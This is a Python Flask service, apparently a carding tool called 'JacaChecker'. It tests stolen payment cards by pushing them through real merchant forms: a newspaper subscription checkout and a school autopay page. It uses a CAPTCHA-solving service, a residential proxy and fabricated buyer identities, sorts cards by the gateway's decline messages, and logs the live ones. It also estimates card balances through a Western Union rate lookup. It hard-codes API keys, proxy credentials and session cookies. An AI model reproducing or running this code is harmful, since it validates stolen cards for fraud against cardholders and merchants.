import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()

    
app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]

def criarTask():
    data = {
        "clientKey": "409154ed879c9e41c25703a6f92289bd",
        "task": {
            "type": "RecaptchaV2TaskProxyless",
            "websiteURL": "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp",
            "websiteKey": "6LeF47cUAAAAAMbDh0XxUukTdBNNF8xjOvWJ5Xtc",
        },
    }
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )
    taskId = criar.json()["taskId"]
    while True:
        data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )
        print(resultado.text)
        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        time.sleep(1)


def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)



def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    
    
def retesteSaldo(card, month, year, cvv):
        saldo(card, month, year, cvv)
        
def Saldo():
    data = {
        "clientKey": "409154ed879c9e41c25703a6f92289bd",
        "task": {
            "type": "RecaptchaV2EnterpriseTask",
            "websiteURL": "https://www.eduwhere.com/secure/autopay_confirm.php",
            "websiteKey": "6LfFHhQUAAAAAFFMGjELVU4DwN8oDECRFp1nCupe",
        },
    }
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )
    taskId = criar.json()["taskId"]
    while True:
        data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )
       #print(resultado.text)
        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        time.sleep(1)
        
def saldo(card, month, year, cvv):
        try:    
        
            url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
            headers = {
                    'Host': 'randomuser.me',
                    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                    'accept': 'application/json, text/plain, */*',
                    'sec-ch-ua-mobile': '?0',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                    'sec-ch-ua-platform': '"Windows"',
                    'origin': 'https://namso-gen.com',
                    'sec-fetch-site': 'cross-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://namso-gen.com/',
                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                    }

            response = requests.get( url, headers=headers, verify=False)
            email = pegarItem(response.text, '"email":"','"')
            nome = pegarItem(response.text, '"first":"','"')
            sobrenome = pegarItem(response.text, '"last":"','"')
            street = pegarItem(response.text, '"name":"','"},"city"')
            snumber = pegarItem(response.text, '"street":{"number":',',')
            city = pegarItem(response.text, '"city":"','"')
            state = pegarItem(response.text, '"state":"','"')
            state = state[0:2].upper()
            postcode = pegarItem(response.text, '"postcode":',',')
            company = pegarItem(response.text, '"username":"','"')
            tel = random.randint(1111,9999)
            tel2 = random.randint(111,999)
            tel3 = random.randint(111,999)
           
            
            recap = Saldo()
            
            if len(year) == 4:
                year = year[2:]
                
            url = "https://www.eduwhere.com/secure/autopay_confirm.php"
            payload = f"pigID=nada&ssl_invoice_number=nadaPnada&ssl_amount=11&invnbr={tel}{tel2}&user_message=+&cctype=VISA&ssl_card_number={card}&exp_date_month={month}&exp_date_year={year}&ssl_cvv2cvc2=232&ssl_first_name={nome}&ssl_last_name={sobrenome}&ssl_company=MR&ssl_avs_address={snumber}+{street}&ssl_address2=&ssl_city={city}&ssl_state={state}&ssl_avs_zip={postcode}&billcountry=United+States&ap_ponumber=&g-recaptcha-response={recap}"
            headers = {
                'Host': 'www.eduwhere.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False)
            
            
            if 'ssl_account_balance' in response.text:
                saldo = pegarItem(response.text, '&amp;ssl_account_balance=','&')       
                url = "https://www.westernunion.com/wuconnect/prices/catalog"
                payload = {
                    "header_request": {
                        "version": "0.5",
                        "request_type": "PRICECATALOG"
                    },
                    "sender": {
                        "client": "WUCOM",
                        "channel": "WWEB",
                        "funds_in": "EB",
                        "curr_iso3": "BRL",
                        "cty_iso2_ext": "BR"
                    },
                    "receiver": {
                        "curr_iso3": "USD",
                        "cty_iso2_ext": "US",
                        "cty_iso2": "US",
                        "receive_amount": saldo
                    }
                }
                headers = {
                'Host': 'www.westernunion.com',
                'Cookie': 'AKCountry=US; AKZip=33101-33102+33106+33111-33112+33114+33116+33122+33124-33138+33142-33147+33150-33159+33161-33170+33172-33190+33193-33194+33196-33197+33199+33231+33233-33234+33238+33242-33243+33245+33247+33255-33257+33261+33265-33266+33269+33280+33283+33296+33299; AKRegioncode=FL; AKCity=MIAMI; AKAreacode=305; AKCounty=MIAMIDADE; WUCountryCookie_=BR; WULanguageCookie_=en; AK_TLS_Version=tls1.2; AKA_A2=A; resolution_height=800; resolution_width=1280; is_tablet=false; is_mobile=false; bm_sz=900D068336BB1A9863D7F7FAFC755E92~YAAQi3QyF8oB/NSOAQAA6ZLg3xdadDyJY1KzEVVFAupq4dcoL2tHifF+Z2qI6NrTEjgMOOcmQQWApqLV1d3GT0AQB5AWITjoMhnpkJKVOO1Z2d6ws24zXS0GM2Gog/fHTB0SEiqVCg3YE9AXWF4c7GetmfhdXtvDTv1zFzLE6wMx5XkHBToamUqIn+1GohvSVyp+GTDn/bYqtgKLRQAUmAnQ57a5uSvH3swiblFesSj/yDRH7bhMW+A9VE19F4pR5NlybvuLe+iyZhgzjBuSdSCX9wierX7YAkNGIyyCAyO2VsEpp3rYNb1LtB0gJffnI3AGRaWP2v01Gt7NBkzBVEK/lLF3VpagNTTgN1cM5IGkzxPXNBmALNc+F5L0mX9vwpJWKQ1wnybUbM3/Lgju0YrcLX0=~3748659~3682873; wu_device_id=cad4bc06-817d-fbbb-9ac6-6532af50f5a9; bm_mi=7BED3D033DD62ECA4F429CA0997E3A1B~YAAQi3QyF/cB/NSOAQAA95zg3xe4OKLvVxbb03N+16y1R9u3AmFdcs2C/nKAVLzCiJ8BpLMG2CZxgGPuRCLP6Jlly/ommBOZ5HPBFdqMDEND1kKaNNtEWAl3epvXDst3wxNeDBASHdktHg8kIBXLtk+O3NX75SVciIpgba8QigPribJdYHUgeWZfsC4eC9QZ28UmbupKEDppgyxgDbAwYp0J9SScj8QzXnXL1qk4F8U+jQgaMi3RXOGdcIiMvWpiJLLqaj18JQDj6cAm6xmuOiVLSeRz+oycXA0EUXIzQ/qroDm2a4iOoJzJByNU2yXtyf4ROktHO8l9fQl1apEViFTj728udKokxuNZbvvwBdUlITic4293RaSFV73gsJEiQQ==~1; bm_sv=6CE349061B39BB269738101000D7007A~YAAQi3QyF/sB/NSOAQAAZZ3g3xe6bVmdDMvpd+tzAggqlSE0ie4/WDhGa4+cdy0dOJSsmbeF4ZJsc79QyuJqdiNpxP0fBMTlB9VMRQcaa5DOsNIhy9Fascy1Ql7eWXGIHrj+28XJEJs26YgGYJ2slMm6mk8Y320H9pmqVXFYF00cApSWHOY0qeXQ7fmxKSt7X/gkCFeLA4+G1fVOwmqZkfiwbVBCszaclsxnGVzxm9WSVQ57BOcBPtc3ezDZc1lnzBF0Wrlp~1; RT="z=1&dm=www.westernunion.com&si=7eb4aabf-16dd-4429-a7dd-d37033f69b5f&ss=lv0f2pfk&sl=1&tt=2tg&rl=1&ld=3j6"; ak_bmsc=48E248DB4F827876D3E0EE883D4635A7~000000000000000000000000000000~YAAQi3QyFxAC/NSOAQAAM6Dg3xcHS89ss5ppILyKqipUhN7hkMAfFO8HsuaFvjdORxMAFdEAzROlgnA7jEUxD68H6Qzd7jERVRE0mDoWICY05q820zDX8c8VGsmpvvKNEhXrDcvS+O/302T0/BOOOR3OMlGmO/8lL+iF0xWCtXGZ5p+jwRuYbayX5b0SutzdHHqR4TMq4WveX5evmdKWbSSOF2gjAMlqBoIDyR6zOotsDJ43lH1/XhXlNzJLHWo3U8RQzn+PWtukCIg+hNVFiz4/eTQoiUwQCoINCheAhQedKpd/b4jbxx4Saq/Jua6F/VP1o1CiwaSMfGth3+k74eWTZ3OskA/Oo1v62PCf7xk+PhPhWITL/Q5UQ0/aos+w95IWvvxCI0Hjpy0mrWtLbCLVMu9AxJ8FGyNw+g9QUOz0Bm3HdJ/1jcdaTDLSDJQreBzMZO+M94hiuF3Bsh6kv0aM14Kbzv8uieRUk4V1tkw6TOkmkgFyPjcDjhsVvBr8qCFAB2PjLLyWjeg+9WS0ohHRR+i8YZ/lcKkS4SLMNm6fSnwa1/YxIMQfko2bBwesqA3g6oJA8dDU; _abck=02A32C543E898E156CC4C46CE13927E6~0~YAAQi3QyFygC/NSOAQAAgKXg3wsFZIWoGk886m47Et7N+eBiSBzqfybDjhJB4D+ZN14Kgok18FCTxKxLX7YR4piRqj4LwdrPwI/ChkuJlUireIx3JFE+gA7094/nCnX7apC2Y5a+PVm7JO7i9aQHryMlVrd7awv4OX+0tdtG4C2DzaL2C7CbVy43n58zFVRFSqSeu8uNidZqUjOt3JWXumjA/kz9PAb8LyzlV82D5b5GpN8002FJBuqBAE6WBrK2NEsmeiG039tSJVr4nRzM4RX7bod69QK3Nv4xcqTXnJ1z6IruqQ1iqT/0J1BJpDJScGDlHXE9iyL2CVjHZxVsB42bhG68B8A4fdJUTkmNwPWtgW7xmoiqHOxx3aPvrBppjJGzQXhELhMO6tJQgFRPJaDFYBzxL3oCq/bx+/vZ~-1~-1~1713156625; AMCVS_AACD3BC75245B4940A490D4D%40AdobeOrg=1; s_ecid=MCMID%7C31598227652875468521561709821570020210; s_plt=3.65; s_pltp=br%3Aen%3Awebsite%3Abrl-to-usd-rate; channel_stack=brl-to-usd-rate.html; affiliate_src_code=; s_cc=true; AMCV_AACD3BC75245B4940A490D4D%40AdobeOrg=179643557%7CMCIDTS%7C19829%7CMCMID%7C31598227652875468521561709821570020210%7CMCAAMLH-1713757825%7C7%7CMCAAMB-1713757825%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1713160226s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C5.5.0; user_txn_state=0:1713153027533; _tq_id.TV-5490904581-1.3c90=bf0802807f803aac.1713153028.0.1713153028..; _tt_enable_cookie=1; _ttp=gOJ5N8UF2wFFOqiqHHEALAJOdPT; _fbp=fb.1.1713153029087.s286046651; akavpau_en=1713153331~id=dc43768e1b6aaf407b8c1cf24af41740; s_NewRepeateVar=1713153033575-New; s_NewRepeatprop=1713153033575-New; AKAreacode=305; AKCity=MIAMI; AKCountry=US; AKCounty=MIAMIDADE; AKRegioncode=FL; AKZip=33101-33102+33106+33111-33112+33114+33116+33122+33124-33138+33142-33147+33150-33159+33161-33170+33172-33190+33193-33194+33196-33197+33199+33231+33233-33234+33238+33242-33243+33245+33247+33255-33257+33261+33265-33266+33269+33280+33283+33296+33299; AK_TLS_Version=tls1.2; _abck=02A32C543E898E156CC4C46CE13927E6~-1~YAAQjXQyF5H579OOAQAAd9Th3wtNwOcXV0h9XRt7oWX7FKT9kbcVvkfO+DRCII/U0AKNl3PDXPy9iUP+w+Jp/Lh7yykl3uBd+2Kodu3vfAterUK+BCQS0gv17177c39xAxZJFKgT2YVVg1HWadTTzo8LWEi641DiGQY5rxTnuX6aimwoYBGcKB3KBs499JU6S8Wm8TVDA/ZM8BRppJNTrUOFrJGq1f6VBoDwGppcVvE2+CxGxa/brk9pWA0hlTGKdLOdjKDPu20MsSDV4dJSq+wa5OsoXDDD4ZmluJ/dC1f14JORajt5jbkfp5eBclw8FEU1hGsByZloPx1bn5WLD7K35qu3CC6diRSOVxZ9Eyu71Orl8Skq7JFi5RhFFrtcP+Iy9dbkMAoV0LdJ6604FOK3bS3hId8Yths7YBNU~0~-1~1713156625; akavpau_en=1713153402~id=7fbd34c1be199867ef2670185644de14; is_mobile=false; is_tablet=false; resolution_height=800; resolution_width=1280',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'content-type': 'text/plain;charset=UTF-8',
                'accept': '*/*',
                'origin': 'https://www.westernunion.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.westernunion.com/br/en/currency-converter/brl-to-usd-rate.html',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }

                response = requests.request("POST", url, headers=headers, json=payload, verify=False)
                brl = pegarItem(response.text, '"send_amount":',',"')
                return brl
        except requests.exceptions.ProxyError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
            retesteSaldo(card, month, year, cvv)
        except requests.exceptions.ConnectionError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
            retesteSaldo(card, month, year, cvv)
        except requests.exceptions.RequestException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
            retesteSaldo(card, month, year, cvv)
            
            
def checker(card, month, year, cvv):
    try:
        #time.sleep(5)
        p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
        start_time = time.time() 


        url = "https://everettweb.newzware.com/newzlib/jsp/ci/login_check_jso.jsp"

        payload = {
            'site':	'sound',
            'login_id':	'9cu324hfvc98743@gmail.com',
            'password':	'radask10',
            'referrer': '',
            'masterL':	'',
            'masterP':	'null',
        }
        headers = {
            'Host': 'everettweb.newzware.com',
            'Cookie': 'nwssmcookie=ssm; nwssmapptype=S',
            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'origin': 'https://everettweb.newzware.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
            'accept-language': 'pt-PT,pt;q=0.9'
            }

        response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
        sessao = response.headers.get('JSESSIONID')


        url = "https://everettweb.newzware.com/ss70v2/common/login.jsp"

        payload = {
            'login_id':	'9cu324hfvc98743@gmail.com',
            'hash':	'a5f7964ccd6d9c98056f5ce3a39c41a3',
            'site':	'sound',
            'encrypted':	'Y',
            'nwmodule':	'',
            'nwpage':	'',
            'rate_id':	'',
            'remember':	'N',
            'reverse_remember_me':	'N',
            'nwregistered':	'',
        }
        headers = {
        'Host': 'everettweb.newzware.com',
        'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'origin': 'https://everettweb.newzware.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
        'accept-language': 'pt-PT,pt;q=0.9'
        }

        response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
        sessao = response.headers.get('JSESSIONID')

        
        
        
        url = "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp"
        payload = "nwmodule=subscribers&nwpage=newstart&nwmessage="
        headers = {
            'Host': 'everettweb.newzware.com',
            'Cookie': f'JSESSIONID={sessao}; _ga_N2QEL3DTVR=GS1.1.1712874273.1.1.1712874445.11.0.0; _fbp=fb.1.1712874759467.494689609; _ga_XD0GNJV3C4=GS1.2.1712874766.1.1.1712874809.17.0.0; _ga_W2SZS1YBEN=GS1.1.1712925791.1.1.1712926522.0.0.0; _ga_1KSYYTLTZT=GS1.1.1712928667.2.0.1712928697.30.0.0; prism_649272325=3e7db6db-07ce-4974-9350-da56352a1ceb; _ga_0ECZGJF1KK=GS1.2.1712929072.4.1.1712932019.0.0.0; _ga_D08DC40GS3=GS1.2.1712929071.4.1.1712932019.60.0.0; _ga=GA1.2.592130853.1712693142; _ga_K5KBE01SMW=GS1.1.1713035588.9.1.1713035635.0.0.0; nwssmcookie=ssm; nwssmapptype=S',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'upgrade-insecure-requests': '1',
            'origin': 'https://everettweb.newzware.com',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp?autoLogout=N&nwmodule=account&nwpage=dashboard',
            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=0, i'
            }
        response = requests.request("POST", url, headers=headers, data=payload, verify=False)
        sessao = pegarItem(response.text, "id='sessionId' value='","'")
        
        
        recap = criarTask()
        
        url = f"https://everettweb.newzware.com/newzlib/jsp/ci/start_subscription.jsp?site=sound&prefix=&fname=CLARKSON&b_fname=&lname=PESRES&b_lname=&suffix=&email=9cu324hfvc98743%40gmail.com&copies=1&h_phone=801-300-6333&d_street=3065%20TRADEPORT%20DR%2C%20209315&d_city=ORLANDO&d_state=FL&d_zip=32824&d_country=US&sameBilling=Y&b_street=&b_city=&b_state=FL&b_zip=&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=222&cc_exp_month={month}&cc_exp_year={year}&cc_holder=fd%20ffs&acct_num=&acct_type=C&acct_receiving=&bd_branch_num=&bd_br_transit=&debit_day=10&retail_rate=31477&start_date=05%2F01%2F2024&recurring=N&tax_amt=0.00&net_amt=152.00&nie_amt=0&grat_amt=0&subtotal_amt=152.00&ju_id=0&occ_id=90411332&login_id=9cu324hfvc98743%40gmail.com&password=8g7BaBGHai2c3VY0jujvcA%3D%3D&encrypted=Y&promoCode=&oneTimeForRecurring=Y&nwCapChallenge={recap}"
        payload = f"https://everettweb.newzware.com/newzlib/jsp/ci/start_subscription.jsp?site=sound&prefix=&fname=CLARKSON&b_fname=&lname=PESRES&b_lname=&suffix=&email=9cu324hfvc98743%40gmail.com&copies=1&h_phone=801-300-6333&d_street=3065%20TRADEPORT%20DR%2C%20209315&d_city=ORLANDO&d_state=FL&d_zip=32824&d_country=US&sameBilling=Y&b_street=&b_city=&b_state=FL&b_zip=&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=222&cc_exp_month={month}&cc_exp_year={year}&cc_holder=fd%20ffs&acct_num=&acct_type=C&acct_receiving=&bd_branch_num=&bd_br_transit=&debit_day=10&retail_rate=31477&start_date=05%2F01%2F2024&recurring=N&tax_amt=0.00&net_amt=152.00&nie_amt=0&grat_amt=0&subtotal_amt=152.00&ju_id=0&occ_id=90411332&login_id=9cu324hfvc98743%40gmail.com&password=8g7BaBGHai2c3VY0jujvcA%3D%3D&encrypted=Y&promoCode=&oneTimeForRecurring=Y&nwCapChallenge={recap}"
        headers = {
            'Host': 'everettweb.newzware.com',
            'Cookie': 'JSESSIONID=eXucGEMcwbTIgOj9xgJ74alL1qTXF8uurtOlpVYy.everett-web; _ga_N2QEL3DTVR=GS1.1.1712874273.1.1.1712874445.11.0.0; _fbp=fb.1.1712874759467.494689609; _ga_XD0GNJV3C4=GS1.2.1712874766.1.1.1712874809.17.0.0; _ga_W2SZS1YBEN=GS1.1.1712925791.1.1.1712926522.0.0.0; _ga_1KSYYTLTZT=GS1.1.1712928667.2.0.1712928697.30.0.0; prism_649272325=3e7db6db-07ce-4974-9350-da56352a1ceb; _ga_0ECZGJF1KK=GS1.2.1712929072.4.1.1712932019.0.0.0; _ga_D08DC40GS3=GS1.2.1712929071.4.1.1712932019.60.0.0; _ga=GA1.2.592130853.1712693142; _ga_K5KBE01SMW=GS1.1.1713035588.9.1.1713035635.0.0.0; nwssmcookie=ssm; nwssmapptype=S',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'accept': '*/*',
            'origin': 'https://everettweb.newzware.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i',
            'Content-Type': 'text/plain'
            }
        response = requests.request("POST", url, headers=headers, data=payload, verify=False)
        
        
        
        time.sleep(4)

        elapsed_time = time.time() - start_time
        
        MSegundos = round(elapsed_time, 2)

    
        if 'adress' in response.text:
            bin = api_bin(card[:6])              
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS [{MSegundos}] MS"                          
            open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} avs  [{MSegundos}] #JacaChecker\n")
            print(Fore.GREEN + f"{x} #JacaChecker")     
            return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
        
        elif 'Insufficient funds' in response.text:
            brl = saldo(card, month, year, cvv)
            bin = api_bin(card[:6])              
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [ Saldo: R${brl} ]"                          
            open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
            print(Fore.GREEN + f"{x} #JacaChecker") 
            return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
            
        elif 'Unidentifiable error issuer generated' in response.text:
            brl = saldo(card, month, year, cvv)
            bin = api_bin(card[:6])              
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [ Saldo: R${brl} ]"                          
            open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
            print(Fore.GREEN + f"{x} #JacaChecker") 
            return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                
        elif 'expired' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card Expired [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
                                    
        elif 'The specified account was not found' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Not Found [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"} 
            
        elif 'The account number failed to pass the LUHN' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Invalid Card [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
            
        elif 'Do not honor' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Do Not Honor [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
            
        elif 'Issuer has flagged this account as fraudulent' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Suspected Fraud [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
            
        elif 'Card has been restricted' in response.text:  
            bin = api_bin(card[:6])
            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card has been restricted [{MSegundos}] MS"     
            print(Fore.RED + f"{x} #JacaChecker")  
            return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
            
        else:
            
            print(Fore.RED + 'Gateway Timeout' + response.text)
            return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}
            
                    


            
    except requests.exceptions.ProxyError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
        
    except requests.exceptions.ConnectionError:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
    except requests.exceptions.RequestException:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
    except RequisicaoException:
        print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
        reteste(card, month, year, cvv)
            


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        #retorno = reteste(card,mes,ano,cvv)
        return {"code": "", "retorno": "Exception !"}
    
    

            
            
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    
